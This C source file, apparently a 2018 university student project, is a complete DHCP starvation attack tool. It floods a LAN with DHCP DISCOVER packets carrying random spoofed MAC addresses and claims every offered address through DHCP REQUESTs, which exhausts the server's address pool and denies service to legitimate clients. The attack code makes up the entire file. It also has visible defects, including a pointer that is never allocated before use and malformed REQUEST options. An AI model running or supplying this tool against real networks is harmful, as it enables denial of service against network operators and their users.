/**
 * Autor: Tomas Lapsansky
 * FIT VUT Brno (xlapsa00)
 *
 * DHCP Starvation attack
 *
 * 9.4.2018
 */

#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/ethernet.h>
#include <net/if.h>
#ifndef __linux__
#include <net/if_dl.h>
#endif
#include <netinet/in.h>
#include <netinet/ip.h>

#define __FAVOR_BSD
#include <netinet/udp.h>
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <ifaddrs.h>

typedef u_int32_t ip4_t;

#define DHCP_CHADDR_LEN 16
#define DHCP_SNAME_LEN  64
#define DHCP_FILE_LEN   128

#define DHCP_BOOTREQUEST                    1
#define DHCP_BOOTREPLY                      2

#define DHCP_HARDWARE_TYPE_10_EHTHERNET     1

#define MESSAGE_TYPE_PAD                    0
#define MESSAGE_TYPE_REQ_SUBNET_MASK        1
#define MESSAGE_TYPE_ROUTER                 3
#define MESSAGE_TYPE_DNS                    6
#define MESSAGE_TYPE_DOMAIN_NAME            15
#define MESSAGE_TYPE_REQ_IP                 50
#define MESSAGE_TYPE_DHCP                   53
#define MESSAGE_TYPE_PARAMETER_REQ_LIST     55
#define MESSAGE_TYPE_END                    255

#define MESSAGE_TYPE_DHCP_SERVER_IDENTIFIER 54

#define DHCP_OPTION_DISCOVER                1
#define DHCP_OPTION_OFFER                   2
#define DHCP_OPTION_REQUEST                 3
#define DHCP_OPTION_PACK                    4

#define DHCP_SERVER_PORT    67
#define DHCP_CLIENT_PORT    68

#define DHCP_MAGIC_COOKIE   0x63825363

struct dhcp {
    u_int8_t    opcode;
    u_int8_t    htype;
    u_int8_t    hlen;
    u_int8_t    hops;
    u_int32_t   xid;
    u_int16_t   secs;
    u_int16_t   flags;
    ip4_t       ciaddr;
    ip4_t       yiaddr;
    ip4_t       siaddr;
    ip4_t       giaddr;
    u_int8_t    chaddr[DHCP_CHADDR_LEN];
    char        bp_sname[DHCP_SNAME_LEN];
    char        bp_file[DHCP_FILE_LEN];
    uint32_t    magic_cookie;
    u_int8_t    bp_options[308];
} __attribute__((packed));
typedef struct dhcp dhcp_t;

pcap_t *pcap_handle;
u_int32_t ip;
dhcp_t *received_dhcp_message;

void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *frame) {
    
    static int counter = 0;
    counter++;
    
    struct ether_header *eframe = (struct ether_header *)frame;
    printf("RECEIVED new frame (%d)\n", counter);
    
    if(htons(eframe->ether_type) == ETHERTYPE_IP) {
        
        struct ip *ip_packet;
        
        ip_packet = (struct ip*)(frame + sizeof(struct ether_header));
        
        if(ip_packet->ip_p == IPPROTO_UDP) {
            
            struct udphdr* udp_packet;
            udp_packet = (struct udphdr *)((char *)ip_packet + sizeof(struct ip));
            
            if (ntohs(udp_packet->uh_sport) == DHCP_SERVER_PORT) {
                
                dhcp_t *dhcp = (dhcp_t *)((char *)udp_packet + sizeof(struct udphdr));
                if (dhcp->opcode != DHCP_OPTION_OFFER)
                    return;
                
                *received_dhcp_message = *dhcp;
                //Get IP address
                ip = ntohl(dhcp->yiaddr);
                
                pcap_breakloop(pcap_handle);
            }
        }
    }
}

/*
 * Return checksum for the given data.
 * Copied from FreeBSD
 */
unsigned short in_cksum(unsigned short *addr, int len) {
    register int sum = 0;
    u_short answer = 0;
    register u_short *w = addr;
    register int nleft = len;
    /*
     * Our algorithm is simple, using a 32 bit accumulator (sum), we add
     * sequential 16 bit words to it, and at the end, fold back all the
     * carry bits from the top 16 bits into the lower 16 bits.
     */
    while (nleft > 1)
    {
        sum += *w++;
        nleft -= 2;
    }
    /* mop up an odd byte, if necessary */
    if (nleft == 1)
    {
        *(u_char *)(&answer) = *(u_char *) w;
        sum += answer;
    }
    /* add back carry outs from top 16 bits to low 16 bits */
    sum = (sum >> 16) + (sum & 0xffff);     /* add hi 16 to low 16 */
    sum += (sum >> 16);             /* add carry */
    answer = ~sum;              /* truncate to 16 bits */
    return (answer);
}

u_int32_t generate_transaction_id() {
    
    //printf("Generating transaction ID\n");
    
    int randid = rand();
    return htonl(randid);
    
}

u_int8_t* generate_mac() {
    
    u_int8_t* newMac = (u_int8_t*)malloc(sizeof(u_int8_t)*6);
    
    for(int i = 0; i < 6; i++) {
        newMac[i] = rand() % 256;
    }
    
    return newMac;
}

// DHCP Discovery packet creator and sender
int dhcp_discovery(u_int8_t *mac) {
    int len = 0;
    u_char packet[4096];
    struct udphdr *udp_header;
    struct ip *ip_header;
    dhcp_t *dhcp;
    
    printf("Sending DHCP_DISCOVERY\n");
    
    bzero(packet, sizeof(packet));
    ip_header = (struct ip *)(packet + sizeof(struct ether_header));
    udp_header = (struct udphdr *)(((char *)ip_header) + sizeof(struct ip));
    dhcp = (dhcp_t *)(((char *)udp_header) + sizeof(struct udphdr));
    
    dhcp->opcode = DHCP_BOOTREQUEST;
    dhcp->htype = DHCP_HARDWARE_TYPE_10_EHTHERNET;
    dhcp->hlen = 6;
    dhcp->hops = 0;
    memcpy(dhcp->chaddr, mac, 6);
    //random trans id
    dhcp->xid = generate_transaction_id();
    
    // set cookie
    dhcp->magic_cookie = htonl(DHCP_MAGIC_COOKIE);
    
    // discovery type
    dhcp->bp_options[0] = MESSAGE_TYPE_DHCP;
    dhcp->bp_options[1] = 1;
    dhcp->bp_options[2] = DHCP_OPTION_DISCOVER;
    dhcp->bp_options[3] = MESSAGE_TYPE_END;
    
    //broadcast flag
    dhcp->flags = htons(1<<15);
    
    len = sizeof(dhcp_t);
    
    if (len & 1)
        len += 1;
    len += sizeof(struct udphdr);
    
    udp_header->uh_sport = htons(DHCP_CLIENT_PORT);
    udp_header->uh_dport = htons(DHCP_SERVER_PORT);
    udp_header->uh_ulen = htons(len);
    udp_header->uh_sum = 0;
    
    len += sizeof(struct ip);
    
    ip_header->ip_hl = 5;
    ip_header->ip_v = IPVERSION;
    ip_header->ip_tos = 0x10;
    ip_header->ip_len = htons(len);
    ip_header->ip_id = htons(0xffff);
    ip_header->ip_off = 0;
    ip_header->ip_ttl = 16;
    ip_header->ip_p = IPPROTO_UDP;
    ip_header->ip_sum = 0;
    ip_header->ip_src.s_addr = 0;
    ip_header->ip_dst.s_addr = 0xFFFFFFFF;
    
    ip_header->ip_sum = in_cksum((unsigned short *) ip_header, sizeof(struct ip));
    
    int result;
    struct ether_header *eframe;
    eframe = (struct ether_header *)packet;
    
    memcpy(eframe->ether_shost, mac, ETHER_ADDR_LEN);
    memset(eframe->ether_dhost, -1,  ETHER_ADDR_LEN);
    eframe->ether_type = htons(ETHERTYPE_IP);
    
    len = len + sizeof(struct ether_header);
    
    //SENDING Packet
    result = pcap_inject(pcap_handle, packet, len);
    if (result <= 0)
        pcap_perror(pcap_handle, "ERROR:");
    
    return 0;
}

//DHCP Request packet creator and sender
int dhcp_request() {
    //http://www.faqs.org/rfcs/rfc2131.html 4.4.1
    
    int len = 0;
    u_char packet[4096];
    struct udphdr *udp_header;
    struct ip *ip_header;
    dhcp_t *dhcp;
    
    printf("Sending DHCP REQUEST for IP: %u.%u.%u.%u\n", ip >> 24, ((ip << 8) >> 24), (ip << 16) >> 24, (ip << 24) >> 24);
    
    bzero(packet, sizeof(packet));
    ip_header = (struct ip *)(packet + sizeof(struct ether_header));
    udp_header = (struct udphdr *)(((char *)ip_header) + sizeof(struct ip));
    dhcp = (dhcp_t *)(((char *)udp_header) + sizeof(struct udphdr));
    
    dhcp->opcode = DHCP_BOOTREQUEST;
    dhcp->htype = DHCP_HARDWARE_TYPE_10_EHTHERNET;
    dhcp->hlen = 6;
    dhcp->hops = 0;
    memcpy(dhcp->chaddr, received_dhcp_message->chaddr, 6);
    dhcp->xid = received_dhcp_message->xid;
    
    // set cookie
    dhcp->magic_cookie = htonl(DHCP_MAGIC_COOKIE);
    
    // request type
    dhcp->bp_options[0] = MESSAGE_TYPE_DHCP;
    dhcp->bp_options[1] = 1;
    dhcp->bp_options[2] = MESSAGE_TYPE_REQ_IP;
    dhcp->bp_options[3] = 4;                        //length
    memcpy(&(dhcp->bp_options[4]), &(received_dhcp_message->yiaddr), 4);  //4 5 6 7
    dhcp->bp_options[8] = MESSAGE_TYPE_DHCP_SERVER_IDENTIFIER;
    dhcp->bp_options[9] = 4;
    memcpy(&(dhcp->bp_options[10]), &(received_dhcp_message->siaddr), 4);  //10 11 12 13
    dhcp->bp_options[14] = DHCP_OPTION_REQUEST;
    dhcp->bp_options[15] = MESSAGE_TYPE_END;
    
    //broadcast flag
    dhcp->flags = htons(1<<15);
    
    
    //copied from dhcp_discover - should be same
    len = sizeof(dhcp_t);
    
    if (len & 1)
        len += 1;
    len += sizeof(struct udphdr);
    
    udp_header->uh_sport = htons(DHCP_CLIENT_PORT);
    udp_header->uh_dport = htons(DHCP_SERVER_PORT);
    udp_header->uh_ulen = htons(len);
    udp_header->uh_sum = 0;
    
    len += sizeof(struct ip);
    
    ip_header->ip_hl = 5;
    ip_header->ip_v = IPVERSION;
    ip_header->ip_tos = 0x10;
    ip_header->ip_len = htons(len);
    ip_header->ip_id = htons(0xffff);
    ip_header->ip_off = 0;
    ip_header->ip_ttl = 16;
    ip_header->ip_p = IPPROTO_UDP;
    ip_header->ip_sum = 0;
    ip_header->ip_src.s_addr = 0;
    ip_header->ip_dst.s_addr = 0xFFFFFFFF;
    
    ip_header->ip_sum = in_cksum((unsigned short *) ip_header, sizeof(struct ip));
    
    int result;
    struct ether_header *eframe;
    eframe = (struct ether_header *)packet;
    
    memcpy(eframe->ether_shost, received_dhcp_message->chaddr, ETHER_ADDR_LEN);
    memset(eframe->ether_dhost, -1,  ETHER_ADDR_LEN);
    eframe->ether_type = htons(ETHERTYPE_IP);
    
    len = len + sizeof(struct ether_header);
    
    //SENDING Packet
    result = pcap_inject(pcap_handle, packet, len);
    if (result <= 0)
        pcap_perror(pcap_handle, "ERROR:");
    
    return 0;
}

int main(int argc, char *argv[]) {
    int result;
    char errbuf[PCAP_ERRBUF_SIZE];
    char *dev;
    u_int8_t mac[6];
    
    srand(time(NULL) + getpid());
    
    if (argc != 3)
    {
        fprintf(stderr, "Help: %s -i <interface>\n", argv[0]);
        return 1;
    }
    
    if (strcmp(argv[1], "-i") != 0) {
        fprintf(stderr, "Help: %s -i <interface>\n", argv[0]);
        return 1;
    }
    
    dev = argv[2];
    
    pcap_handle = pcap_open_live(dev, BUFSIZ, 0, 10, errbuf);
    if (pcap_handle == NULL) {
        
        printf("Couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }
    
    if(fork() == 0) {
        //Spamming DHCP DISCOVERY packet
        while(1) {
            memcpy(mac, generate_mac(), 6);     //TODO free
            
            result = dhcp_discovery(mac);
            if (result != 0) {
                printf("Couldn't send DHCP DISCOVERY on device %s: %s\n", dev, errbuf);
                pcap_close(pcap_handle);
                return result;
            }
        }
    } else {
        // Waiting for offer
        while(1) {
            ip = 0;
            pcap_loop(pcap_handle, -1, packet_handler, NULL);
            printf("Got IP %u.%u.%u.%u\n", ip >> 24, ((ip << 8) >> 24), (ip << 16) >> 24, (ip << 24) >> 24);
            dhcp_request();
        }
    }
    pcap_close(pcap_handle);
    
    return 0;
}
